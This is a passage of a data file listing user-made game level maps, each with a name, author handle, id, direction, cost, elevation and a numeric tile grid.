,0,0,0,0,0,0,0,0,5,1,10,90,5,5,90,15,1,185,40,145,0,0,0,0,0,0,145,31,185,95,111,11,12,13,14,15,1,5,0,0,0,0,0,0,0,0,31,125,185,1,1,1,1,1,1,1,1,185,41,145,0,0,0,0,0,0,0,0,5,185,185,185,5,185,185,5,185,185,41,145,0,0,0,0,0,0,0,0,0,41,43,43,0,42,42,0,41,41,0,0,0,0,0,0,0,0,0,0,0,188,43,43,0,188,188,0,188,188,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,77,24,24,24,24,24,24,77,0,0,0,0,0,0,0,0,0,0,0,0,77,24,89,2,2,89,24,77,0,0,0,0,0,0]});
maps.push({name="Blizzard Wants Money",author="Block",id="#1667568099",direction="forward",cost=204,elevation=0,map=[0,0,0,0,119,119,119,7,2,2,7,7,7,7,7,7,7,0,0,0,0,0,0,119,119,119,119,7,7,7,7,7,7,7,7,7,7,7,0,0,0,0,119,119,119,119,119,0,0,0,0,0,7,7,7,7,7,7,7,0,0,119,119,119,119,0,0,0,0,0,0,0,0,7,7,7,7,7,7,7,119,119,119,119,0,0,0,0,0,0,0,0,7,7,7,0,7,7,7,7,119,119,119,0,0,0,0,0,0,0,0,7,7,7,0,0,0,7,7,7,119,119,0,0,0,0,0,0,0,0,7,7,7,0,0,0,0,0,7,7,119,119,0,0,0,0,0,0,0,7,7,7,0,0,0,0,0,0,7,7,119,119,0,0,0,0,0,0,7,7,7,0,0,0,0,0,0,0,7,7,119,119,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,119,119,0,0,0,0,0,0,7,7,7,0,0,0,0,0,0,0,7,7,119,119,0,0,0,0,0,0,0,7,7,7,0,0,0,0,0,0,7,7,119,119,0,0,0,0,0,0,0,0,7,7,7,0,0,0,0,0,7,7,119,119,119,0,0,0,0,0,0,0,0,7,7,7,0,0,0,7,7,7,119,119,119,119,0,0,0,0,0,0,0,0,7,7,0,7,7,7,7,7,119,119,119,119,119,0,0,0,0,0,0,0,0,7,7,7,7,7,7,7,0,119,119,119,119,119,0,0,0,0,0,0,0,7,7,119,7,119,119,119,0,0,119,119,119,119,119,0,0,0,0,0,7,7,7,119,93,119,0,119,0,0,0,119,119,119,119,7,7,7,7,7,7,7,7,119,7,119,0,119,0,0,0,0,119,119,119,7,2,2,7,7,7,7,7,119,119,119,0,119]});
maps.push({name="NormalPath",author="Denislafff",id="#1667693989",direction="right",cost=218,elevation=0,map=[0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,65,65,5,5,65,65,65,65,65,65,65,65,65,65,65,65,5,0,0,5,65,65,5,5,65,65,65,65,65,65,65,65,65,65,65,65,5,0,0,5,65,65,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,2,0,5,65,65,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,2,0,5,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,5,0,0,5,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="StayonthePath",author="Niikos",id="#1667856483",direction="forward",cost=555,elevation=0,map=[0,90,2,2,90,90,90,90,87,0,90,90,0,90,88,90,87,90,90,0,0,90,19,19,90,90,89,88,90,90,90,90,90,0,90,94,90,90,94,0,0,90,19,19,19,90,90,0,90,90,87,90,90,90,90,90,0,90,88,0,0,90,19,19,19,19,86,90,90,90,89,89,90,87,90,90,90,87,90,0,0,90,19,19,19,19,19,90,90,88,90,90,90,90,90,94,90,90,94,0,0,90,90,19,19,19,19,19,90,90,90,90,0,90,89,90,90,89,90,0,0,90,90,86,19,19,19,19,19,90,90,90,90,90,90,90,90,90,90,0,0,90,90,90,90,19,19,19,19,19,90,90,86,90,90,87,0,90,90,0,0,87,90,90,90,90,19,19,19,19,19,90,90,90,88,90,90,90,90,0,0,90,90,0,90,90,90,19,19,19,19,19,86,90,90,90,90,87,90,0,0,90,0,90,90,88,90,86,19,19,19,19,19,90,90,90,90,90,90,0,0,88,90,90,89,90,90,90,90,19,19,19,19,19,90,90,90,88,90,0,0,90,90,87,90,90,0,90,88,90,19,19,19,19,19,90,86,90,90,0,0,90,90,90,90,90,90,90,90,90,90,19,19,19,19,19,90,90,90,0,0,90,90,90,90,0,90,90,90,89,90,90,19,19,19,19,19,90,90,0,0,93,0,90,93,90,90,89,87,90,88,90,90,19,19,19,19,19,90,0,0,90,90,87,0,90,90,0,90,90,90,90,89,90,19,19,19,19,19,0,0,90,90,90,90,90,90,90,90,0,90,90,90,90,90,19,19,19,19,0,0,93,90,90,93,90,87,90,87,90,90,90,90,89,90,90,19,19,19,0,0,90,88,87,90,90,90,90,90,90,86,90,90,90,90,90,90,2,2,0]});
maps.push({name="Gliding through life",author="Luffaren",id="#1667871040",direction="right",cost=370,elevation=-19,map=[0,0,24,2,2,24,0,0,24,24,0,0,0,0,0,24,24,24,24,0,0,0,24,65,65,24,135,135,24,24,135,135,135,135,135,24,93,24,24,0,0,0,24,65,65,24,135,135,24,24,135,135,135,135,135,24,24,94,24,0,0,0,24,24,24,24,0,0,24,24,0,0,0,0,0,24,24,24,24,0,0,0,0,135,135,0,0,0,135,135,0,0,0,0,0,67,135,135,67,0,0,0,0,135,135,0,0,0,135,135,0,0,0,0,0,0,135,135,0,0,0,0,0,135,135,0,0,0,135,135,0,0,0,0,0,0,135,135,0,0,0,0,0,135,135,0,0,0,135,135,0,0,0,0,0,0,135,135,0,0,0,0,0,135,135,0,0,0,135,135,0,0,0,0,0,9,9,9,9,1,1,1,1,135,135,67,67,67,135,135,0,0,0,0,0,94,9,9,9,1,1,93,1,135,135,1,1,1,135,135,1,135,135,135,135,9,1,95,95,1,1,9,135,135,135,135,135,135,135,135,135,135,135,135,135,9,1,9,9,1,1,1,1,0,0,0,1,0,0,0,0,0,1,1,1,1,1,5,5,1,0,0,0,135,135,0,1,0,135,135,0,0,1,1,1,0,1,5,5,1,0,0,0,135,135,0,14,12,5,5,5,67,0,67,1,1,1,5,5,5,0,0,14,14,14,14,14,1,1,94,5,135,135,135,135,5,95,5,5,2,0,0,14,14,1,1,1,5,95,5,5,135,135,135,135,5,95,5,5,2,0,0,14,14,95,14,1,93,1,97,5,67,0,67,1,1,1,5,5,5,0,0,14,94,1,93,1,1,1,0,0,0,0,67,1,0,1,1,1,1,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="TheBasicsv2",author="Niikos",id="#1667913347",direction="right",cost=258,elevation=12,map=[0,0,0,0,0,0,0,1,9,2,2,9,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,144,9,9,144,1,0,0,0,0,0,0,0,97,40,0,0,0,0,0,1,9,9,9,9,1,0,0,0,0,0,0,0,40,40,40,40,141,49,49,142,9,9,9,9,142,49,49,141,40,40,40,40,93,93,40,40,141,49,49,142,9,9,9,9,142,49,49,141,40,40,94,94,1,1,1,1,1,1,1,1,9,9,9,9,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,9,9,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,96,96,96,96,96,96,0,0,0,0,0,0,0,0,0,0,0,0,0,0,96,96,96,96,96,96,0,0,0,0,0,0,0,0,0,0,0,0,0,0,31,31,31,31,31,31,0,0,0,0,0,0,0,0,0,0,0,0,0,0,144,31,31,31,31,144,0,0,0,0,0,0,0,0,0,0,0,0,0,0,87,31,31,31,31,87,0,0,0,0,0,0,0,0,0,0,0,0,0,0,144,31,31,31,31,144,0,0,0,0,0,0,0,93,93,93,0,0,0,0,0,141,141,141,141,0,0,0,0,0,0,0,0,42,42,42,0,0,0,0,0,41,41,41,41,0,0,0,0,0,0,0,0,42,42,42,0,41,0,40,0,41,41,41,41,0,0,0,0,0,0,0,0,99,42,42,0,0,0,0,0,89,41,41,41,41,41,98,98,41,41,41,2,0,0,0,0,0,0,0,0,144,41,41,41,41,41,98,98,41,41,41,2,0,0,0,0,0,0,0,0,144,144,144,89,0,0,0,0,0,0,0,0]});
maps.push({name="Wackington city Lite",author="Dogeeri",id="#1667923344",direction="right",cost=302,elevation=4,map=[0,0,0,0,0,0,0,11,2,2,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,11,11,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,142,142,142,142,1,1,1,1,0,0,0,0,0,94,31,0,0,0,92,11,91,11,11,11,144,144,93,1,0,0,0,0,0,143,143,143,0,0,0,1,12,11,11,11,1,1,1,1,0,0,0,0,0,72,72,72,0,0,0,95,12,12,11,11,98,144,94,1,0,0,0,0,0,72,72,72,0,0,0,95,12,12,12,11,1,1,1,1,0,0,0,0,0,66,66,66,0,0,0,95,95,95,0,0,0,0,0,0,0,0,0,0,0,66,125,66,0,0,0,12,12,95,0,87,0,0,0,0,0,0,0,0,0,66,66,66,0,0,0,12,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,12,12,12,0,87,0,0,0,0,0,0,0,87,0,55,55,55,117,17,17,14,14,14,0,0,0,0,0,0,0,0,0,0,0,117,55,116,117,17,17,15,14,90,0,0,0,0,0,0,0,0,34,34,35,99,55,116,90,1,1,1,1,1,1,1,1,0,0,0,0,0,0,34,35,117,55,116,117,17,98,14,14,90,12,91,91,91,91,91,130,0,0,35,35,55,55,55,117,17,98,14,14,13,12,91,89,91,91,91,130,0,0,35,2,0,0,0,0,0,1,13,13,13,12,91,91,91,128,91,130,0,0,35,2,43,43,0,0,0,1,1,12,12,12,91,91,91,91,91,130,0,0,35,35,93,43,0,0,0,1,132,143,1,1,1,1,0,0,0,0,0,0,34,35,131,43,0,0,0,1,1,1,1,0,0,0,0,0,0,0,0,34,34,35]});
maps.push({name="infinite impermanent",author="lv 100 crobat",id="#1667932114",direction="left",cost=479,elevation=10,map=[0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,2,2,0,0,0,1,14,14,13,13,1,1,1,1,1,1,1,1,1,1,66,66,1,0,0,1,14,14,13,13,1,1,66,66,66,66,66,66,1,1,66,66,1,0,0,1,15,15,12,12,1,1,66,66,66,66,66,66,1,1,66,66,1,0,0,1,15,15,12,12,1,1,66,66,1,1,66,66,1,1,66,66,1,0,0,1,16,16,11,11,1,1,66,66,1,1,66,66,1,1,66,66,1,0,0,1,16,16,11,11,1,1,66,66,1,1,66,66,1,1,66,66,1,0,0,1,17,17,10,10,1,1,66,66,1,1,66,66,1,1,66,66,1,0,0,1,17,17,10,10,1,1,66,66,1,1,66,66,1,1,66,66,1,0,0,1,18,18,9,9,1,1,66,66,1,1,66,66,1,1,66,66,1,0,0,1,18,18,9,9,1,1,66,66,1,1,66,66,1,1,66,66,1,0,0,1,19,19,8,8,1,1,66,66,1,1,66,66,1,1,66,66,1,0,0,1,19,19,8,8,1,1,66,66,1,1,66,66,1,1,66,66,1,0,0,1,20,20,7,7,1,1,66,66,1,1,66,66,1,1,66,66,1,0,0,1,20,20,7,7,1,1,66,66,1,1,66,66,1,1,66,66,1,0,0,1,21,21,6,6,1,1,66,66,1,1,66,66,1,1,66,66,1,0,0,1,21,21,6,6,1,1,66,66,1,1,66,66,1,1,66,66,1,2,24,24,23,23,5,5,66,66,66,66,1,1,66,66,66,66,66,66,1,2,24,24,23,23,5,5,66,66,66,66,1,1,66,66,66,66,66,66,1,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="Playercount Check",author="ZpLit",id="#1667969944",direction="forward",cost=194,elevation=-6,map=[0,0,0,0,0,0,0,17,52,2,2,52,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,52,52,52,52,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,52,52,52,52,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,52,90,52,52,17,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,52,52,52,52,17,17,17,0,0,0,0,0,0,0,0,0,17,52,52,52,52,52,52,52,52,52,52,17,0,0,0,0,0,0,0,0,17,52,100,52,52,52,90,52,52,100,52,17,0,0,0,0,0,0,0,0,17,52,52,90,52,52,52,52,52,52,52,17,0,0,0,0,0,0,0,0,17,52,52,52,0,0,0,0,90,52,52,17,0,0,0,0,0,0,0,0,17,52,52,52,0,94,94,0,52,52,52,17,0,0,0,0,0,0,0,0,17,52,90,52,0,94,94,0,52,52,52,17,0,0,0,0,0,0,0,0,17,52,52,52,1,1,1,1,52,90,52,17,0,0,0,0,0,0,0,0,17,52,52,87,52,52,52,52,87,52,52,17,0,0,0,0,0,0,0,0,17,52,100,52,90,52,52,52,52,100,52,17,0,0,0,0,0,0,0,0,17,52,52,52,52,52,52,90,52,52,52,17,0,0,0,0,0,0,0,0,0,17,17,17,90,52,52,52,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,17,52,52,90,52,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,52,52,52,52,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,6,6,6,6,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,88,2,2,88,17,0,0,0,0,0,0,0]});
maps.push({name="Pizza Is Aggressive",author="ZpLit",id="#1667975299",direction="forward",cost=146,elevation=0,map=[0,0,0,0,0,0,0,1,14,2,2,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,14,14,1,0,0,0,0,0,0,0,0,0,0,0,0,1,86,14,94,94,14,86,1,0,0,0,0,0,0,0,0,0,0,0,0,1,14,1,1,1,1,14,1,0,0,0,0,0,0,0,0,0,0,0,0,1,14,1,0,0,1,14,1,0,0,0,0,0,0,0,0,0,0,0,0,1,14,1,0,0,1,14,1,0,0,0,0,0,0,0,0,0,0,0,0,1,95,1,0,0,1,95,1,0,0,0,0,0,0,0,0,0,0,0,0,1,91,1,1,1,1,91,1,0,0,0,0,0,0,0,0,0,0,0,0,1,91,86,14,14,86,91,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,1,1,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,1,1,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,1,1,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,1,1,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,95,1,1,95,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,91,1,1,91,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,91,14,14,91,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,88,2,2,88,1,0,0,0,0,0,0,0]});
maps.push({name="Gust Is Aggressive",author="ZpLit",id="#1667982188",direction="left",cost=94,elevation=-6,map=[0,0,0,0,0,0,0,0,94,2,2,94,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,20,20,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,17,95,95,17,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,16,1,0,0,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,15,1,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,14,1,0,0,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,87,95,95,14,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,0,0,1,13,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,1,12,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,0,0,1,11,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,11,95,95,87,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,12,0,0,0,0,0,0,0,0,0,0,0,1,0,87,0,0,87,0,24,13,0,0,0,0,0,0,0,0,0,0,0,2,1,0,0,0,0,0,24,14,0,0,0,0,0,0,0,0,0,0,0,2,14,14,14,14,14,14,93,87,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="In A Ugly Castle",author="FL00D",id="#1667983911",direction="forward",cost=196,elevation=5,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,22,22,16,16,16,22,105,105,22,16,16,16,22,22,0,0,0,0,0,0,22,22,45,45,45,45,45,45,45,45,45,45,22,22,0,0,0,0,0,0,16,45,45,45,45,45,45,45,45,45,45,45,45,16,0,0,0,0,0,0,16,45,45,7,8,9,10,10,9,8,7,45,45,16,0,0,0,0,0,0,16,45,45,6,5,5,5,5,5,5,6,45,45,16,0,0,0,0,0,0,16,45,45,5,5,5,5,5,5,5,5,45,45,16,0,0,0,0,0,0,16,45,45,5,5,5,5,5,5,5,5,45,45,16,0,0,0,0,0,0,16,45,45,5,5,5,5,5,5,5,5,45,45,16,0,0,0,0,0,0,16,45,45,5,5,5,5,5,5,5,5,45,45,16,0,0,0,0,0,0,16,45,45,5,5,5,5,5,5,5,5,45,45,16,0,0,0,0,0,0,16,45,45,45,45,45,45,45,45,45,45,45,45,16,0,0,0,0,0,0,22,22,45,45,45,45,45,45,45,45,45,45,22,22,0,0,0,0,0,0,22,22,16,16,16,16,50,50,16,16,16,16,22,22,0,0,0,0,0,0,0,0,0,0,0,0,30,30,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="Hall and Props",author="FL00D",id="#1667983994",direction="right",cost=293,elevation=0,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,9,9,1,1,1,1,1,1,1,1,0,0,0,0,1,93,93,9,9,1,9,90,1,9,9,90,9,9,9,1,0,0,0,0,1,93,93,9,9,1,9,9,1,9,9,9,9,90,9,1,0,0,0,0,1,1,1,9,9,1,90,9,1,90,9,1,9,9,9,1,0,0,0,0,1,9,9,90,9,9,9,9,1,9,9,1,9,9,90,1,0,0,0,0,1,90,9,9,9,90,9,90,1,9,90,1,9,9,9,1,0,0,0,0,1,9,9,1,1,1,9,9,1,9,9,1,1,90,9,1,0,0,0,0,1,9,90,1,94,94,9,9,1,90,9,9,1,9,9,1,0,0,0,0,1,9,9,1,94,94,9,9,1,9,9,90,1,9,90,1,0,0,0,0,1,90,9,1,1,1,1,1,1,1,9,9,1,9,9,1,0,0,0,0,1,9,9,1,9,9,9,90,9,1,90,9,1,90,9,1,0,0,0,0,1,9,90,1,9,90,9,9,9,1,9,9,1,9,9,1,0,0,0,0,1,9,9,1,9,9,1,9,90,1,9,90,1,9,90,1,0,0,0,0,1,9,9,90,9,9,1,9,9,9,9,9,1,9,9,9,9,2,0,0,1,90,9,9,9,90,1,9,9,9,90,9,1,9,9,9,9,2,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Prop Room 7",author="FL00D",id="#1667984034",direction="left",cost=235,elevation=-10,map=[0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,19,19,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,119,119,119,119,119,1,0,0,0,0,0,0,0,1,1,1,1,1,1,1,90,90,90,90,90,1,0,0,0,0,2,9,9,9,109,90,90,90,90,1,90,90,90,90,90,1,0,0,0,0,2,9,9,9,109,90,90,90,90,1,90,90,90,90,90,1,0,0,0,0,0,0,0,1,90,90,90,90,90,1,119,131,119,131,119,1,0,0,0,0,0,0,0,1,90,90,90,90,90,1,1,1,1,1,1,1,0,0,0,0,0,0,0,1,90,90,90,90,90,1,1,1,1,1,1,1,0,0,0,0,0,0,0,1,109,109,1,1,1,1,114,132,114,132,114,1,0,0,0,0,0,0,0,1,29,29,0,0,0,1,114,114,114,114,114,1,0,0,0,0,0,0,0,1,30,30,0,0,0,1,90,90,90,90,90,1,0,0,0,0,0,0,0,1,31,31,32,33,34,114,90,90,90,90,90,1,0,0,0,0,0,0,0,1,31,31,32,33,34,114,90,90,90,90,90,1,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Split Inside",author="FL00D",id="#1667984067",direction="forward",cost=220,elevation=12,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,10,10,1,1,1,1,1,1,0,0,0,0,0,0,1,10,10,10,10,10,10,10,10,10,10,10,10,1,0,0,0,0,0,0,1,10,1,1,1,1,1,1,1,1,1,1,10,1,0,0,0,0,0,0,1,10,1,16,16,16,132,132,16,16,16,1,10,1,0,0,0,0,0,0,1,10,1,16,1,1,1,1,1,1,16,1,10,1,0,0,0,0,0,0,1,10,1,16,1,22,134,134,22,1,16,1,10,1,0,0,0,0,0,0,1,10,1,16,1,22,22,22,22,1,16,1,10,1,0,0,0,0,0,0,1,10,1,16,1,22,22,22,22,1,16,1,10,1,0,0,0,0,0,0,1,10,1,16,1,22,22,22,22,1,16,1,10,1,0,0,0,0,0,0,1,10,1,16,1,1,22,22,1,1,16,1,10,1,0,0,0,0,0,0,1,10,1,16,133,16,22,22,16,133,16,1,10,1,0,0,0,0,0,0,1,10,1,1,1,1,22,22,1,1,1,1,10,1,0,0,0,0,0,0,1,10,10,10,131,10,22,22,10,131,10,10,10,1,0,0,0,0,0,0,1,1,1,1,1,1,22,22,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,22,22,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,22,22,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="What Sticks On Walls",author="FL00D",id="#1667984110",direction="right",cost=510,elevation=0,map=[0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,144,5,5,144,1,0,0,0,0,0,1,1,1,1,1,1,1,1,0,1,144,5,5,144,1,0,0,0,0,0,1,144,144,144,144,144,144,144,0,1,144,5,5,144,1,1,1,1,1,1,1,144,5,5,5,5,5,5,2,1,144,5,5,144,144,144,144,144,144,144,1,144,5,5,5,5,5,5,2,1,144,5,5,5,5,5,5,5,5,144,1,144,5,5,144,144,144,144,0,1,144,5,5,5,5,5,5,5,5,144,1,144,5,5,144,1,1,1,0,1,144,144,144,144,144,144,144,5,5,144,1,144,5,5,144,1,0,0,0,1,1,1,1,1,1,1,144,5,5,144,1,144,5,5,144,1,0,0,0,0,0,0,0,0,0,1,144,5,5,144,1,144,5,5,144,1,0,0,0,0,0,0,0,0,0,1,144,5,5,144,1,144,5,5,144,1,0,0,0,0,0,0,0,0,0,1,144,5,5,144,1,144,5,5,144,1,0,0,0,0,0,0,0,0,0,1,144,5,5,144,1,144,5,5,144,1,0,0,0,0,0,0,0,0,0,1,144,5,5,144,1,144,5,5,144,1,0,0,0,0,0,0,0,0,0,1,144,5,5,144,144,144,5,5,144,1,0,0,0,0,0,0,0,0,0,1,144,5,5,5,5,5,5,5,144,1,0,0,0,0,0,0,0,0,0,1,144,5,5,5,5,5,5,5,144,1,0,0,0,0,0,0,0,0,0,1,144,144,144,144,144,144,144,144,144,1,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Teleport 50 50",author="FL00D",id="#1667984152",direction="right",cost=142,elevation=0,map=[0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,0,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,13,13,0,1,132,13,1,132,13,1,0,0,0,0,0,0,0,0,0,0,13,13,0,1,13,13,1,13,13,1,0,0,0,0,0,0,0,0,0,0,13,13,0,1,13,133,1,13,136,1,0,0,0,0,0,0,0,0,0,0,13,13,0,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,13,13,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,134,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,131,13,13,96,96,13,13,13,13,13,13,13,13,13,13,13,13,2,0,13,13,13,13,96,96,13,13,13,13,13,13,13,13,13,13,13,13,2,0,0,0,0,0,0,0,0,0,13,97,13,0,13,137,13,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,13,0,13,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Trigger Tower 16",author="FL00D",id="#1667984202",direction="left",cost=225,elevation=19,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,5,5,1,0,2,24,96,96,24,132,24,0,0,0,0,0,0,0,0,0,5,5,1,0,2,24,96,96,24,24,24,0,0,0,0,0,0,0,0,0,5,5,1,0,0,1,24,24,1,0,0,0,0,0,0,0,0,0,0,0,5,5,1,0,0,1,24,24,1,0,0,0,0,0,0,0,0,0,0,0,5,5,1,0,0,1,24,24,1,0,0,43,34,44,35,37,26,0,25,25,5,5,1,0,0,1,24,24,1,0,0,33,1,124,1,1,37,0,0,0,5,5,1,0,0,1,24,24,1,0,0,42,1,24,24,1,27,0,0,0,5,5,1,0,0,1,24,24,1,0,0,32,1,97,131,1,38,0,0,0,5,5,1,0,0,1,24,24,1,0,0,41,1,1,1,1,28,0,0,0,5,5,1,0,0,1,24,24,1,0,0,31,41,30,40,29,39,0,0,0,5,5,1,0,0,1,24,24,1,0,0,0,0,0,0,0,0,0,0,0,5,5,1,0,0,1,24,24,1,0,0,0,0,0,0,0,0,0,0,0,5,5,1,0,0,1,24,24,1,0,0,0,0,0,0,0,0,0,0,0,5,5,1,0,0,1,3,3,5,5,5,5,5,5,5,5,5,5,5,5,5,5,1,0,0,1,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,1,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
